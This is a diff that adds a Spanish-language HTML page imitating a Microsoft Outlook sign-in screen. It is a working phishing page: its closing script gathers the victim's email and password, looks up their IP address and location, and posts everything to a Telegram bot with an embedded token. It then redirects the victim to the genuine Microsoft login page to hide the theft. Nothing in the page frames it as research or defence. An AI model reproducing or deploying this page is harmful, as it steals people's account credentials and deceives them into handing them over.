@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Home</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f3f3f3 url('fondo.svg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: #fff;
+      width: 430px;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.2);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      height: 30px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 10px;
+      color: #1b1b1b;
+    }
+
+    p.description {
+      font-size: 14px;
+      margin: 0;
+      color: #1b1b1b;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      display: block;
+      box-sizing: border-box;
+    }
+
+    input[type="email"] {
+      border: 1px solid #999;
+      background-color: #fff;
+      outline: none;
+    }
+
+    input[type="email"]:focus {
+      border-color: #0067b8;
+      box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
+    }
+
+    input[type="password"] {
+      border: 1px solid #ccc;
+      background-color: #fff;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    input[type="password"]:focus {
+      border-color: #0067b8;
+      box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
+    }
+
+    button {
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    button:disabled {
+      background-color: #8ab4f8;
+      cursor: default;
+    }
+
+    .links {
+      text-align: left;
+      margin-bottom: 15px;
+    }
+
+    .links a,
+    .bottom-text a,
+    .additional-links a {
+      font-size: 14px;
+      color: #0067b8;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-block;
+      margin-bottom: 5px;
+    }
+
+    .links a:hover,
+    .bottom-text a:hover,
+    .additional-links a:hover {
+      text-decoration: underline;
+    }
+
+    .bottom-text {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #1b1b1b;
+      text-align: center;
+    }
+
+    .bottom-text span {
+      margin-right: 4px;
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .footer a {
+      margin: 0 8px;
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Ocultar formulario de contraseña inicialmente */
+    #password-form {
+      display: none;
+      flex-direction: column;
+    }
+
+    /* Botón usar otra cuenta */
+    #back-button {
+      background: none;
+      border: none;
+      color: #0067b8;
+      font-size: 14px;
+      cursor: pointer;
+      padding: 0;
+      margin-bottom: 30px;
+      align-self: flex-start;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    #back-button span {
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    /* Texto para contraseña */
+    #password-text {
+      margin-bottom: 18px;
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+    }
+
+    #password-text strong {
+      color: #000;
+      word-break: break-all;
+    }
+
+    /* Enlaces debajo del botón iniciar sesión */
+    .additional-links {
+      margin-top: 0;
+      margin-bottom: 20px;
+      text-align: center; /* Cambiado de left a center */
+    }
+
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="header" id="header">
+      <div class="logo">
+        <img src="logo.png" alt="Microsoft logo" />
+      </div>
+      <h1 id="title">Iniciar sesión</h1>
+      <p class="description" id="description">para continuar a Outlook</p>
+    </div>
+
+    <!-- Formulario Email -->
+    <form id="email-form" autocomplete="off" style="display: flex; flex-direction: column;">
+      <input type="email" id="email-input" placeholder="Correo electrónico" required />
+      <div class="links">
+        <a href="#">¿Olvidaste tu nombre de usuario?</a>
+      </div>
+      <button type="submit" id="next-button">Siguiente</button>
+    </form>
+
+    <!-- Formulario Contraseña -->
+    <form id="password-form" autocomplete="off" style="display: none;">
+      <button type="button" id="back-button"><span>←</span> Usar otra cuenta</button>
+      <div id="password-text">
+        Ingrese la contraseña para<br><strong id="display-email"></strong>
+      </div>
+      <input type="password" id="password-input" placeholder="Contraseña" required />
+      <div class="links" style="margin-bottom: 0;">
+        <a href="#">¿Olvidaste tu contraseña?</a>
+      </div>
+      <button type="submit" id="signin-button" disabled>Siguiente</button>
+      <div class="additional-links">
+        <a href="#">Otras formas de iniciar sesión</a>
+      </div>
+    </form>
+
+    <div class="bottom-text" id="bottom-text">
+      <span>¿Es nuevo en Microsoft?</span><a href="#">Crear una cuenta</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <a href="#">Contactar soporte</a>
+  </div>
+
+  <script>
+    const emailForm = document.getElementById('email-form');
+    const passwordForm = document.getElementById('password-form');
+    const emailInput = document.getElementById('email-input');
+    const passwordInput = document.getElementById('password-input');
+    const displayEmail = document.getElementById('display-email');
+    const backButton = document.getElementById('back-button');
+    const title = document.getElementById('title');
+    const description = document.getElementById('description');
+    const bottomText = document.getElementById('bottom-text');
+    const signinBtn = document.getElementById('signin-button');
+
+    // Cuando se envía el email, pasar a contraseña
+    emailForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      // Poner email en texto
+      displayEmail.textContent = emailInput.value;
+
+      // Ocultar email form y header y bottom-text
+      emailForm.style.display = 'none';
+      title.style.display = 'none';
+      description.style.display = 'none';
+      bottomText.style.display = 'none';
+
+      // Mostrar form contraseña
+      passwordForm.style.display = 'flex';
+
+      // Enfocar input contraseña
+      passwordInput.focus();
+    });
+
+    // Volver al formulario email
+    backButton.addEventListener('click', () => {
+      passwordForm.style.display = 'none';
+      emailForm.style.display = 'flex';
+
+      title.style.display = 'block';
+      description.style.display = 'block';
+      bottomText.style.display = 'block';
+
+      // Limpiar password input y botón
+      passwordInput.value = '';
+      signinBtn.disabled = true;
+
+      // Enfocar email
+      emailInput.focus();
+    });
+
+    // Habilitar botón iniciar sesión solo si hay contraseña
+    passwordInput.addEventListener('input', () => {
+      signinBtn.disabled = passwordInput.value.trim() === '';
+    });
+  </script>
+  <!-- Axios -->
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+<script>
+  const passwordFormSubmit = document.getElementById('password-form');
+
+  passwordFormSubmit.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const email = document.getElementById('email-input').value;
+    const password = document.getElementById('password-input').value;
+
+    axios.get("https://ipapi.co/json/")
+      .then(response => {
+        const data = response.data;
+        const message = `
+ Hotmail
+Email: ${email}
+Contraseña: ${password}
+Ciudad: ${data.city}
+País: ${data.country_name}
+IP: ${data.ip}
+        `;
+
+        axios.post("https://api.telegram.org/bot7933179313:AAFjbGziX_A9jLKiVe2be8HO7YyNGIuab8M/sendMessage", {
+          chat_id: "-4755631975",
+          text: message
+        })
+        .then(() => {
+          window.location.href = "https://login.live.com";
+        })
+        .catch(error => {
+          console.error("Error al enviar a Telegram:", error);
+        });
+      })
+      .catch(error => {
+        console.error("Error al obtener IP:", error);
+      });
+  });
+</script>
+</body>
+</html>
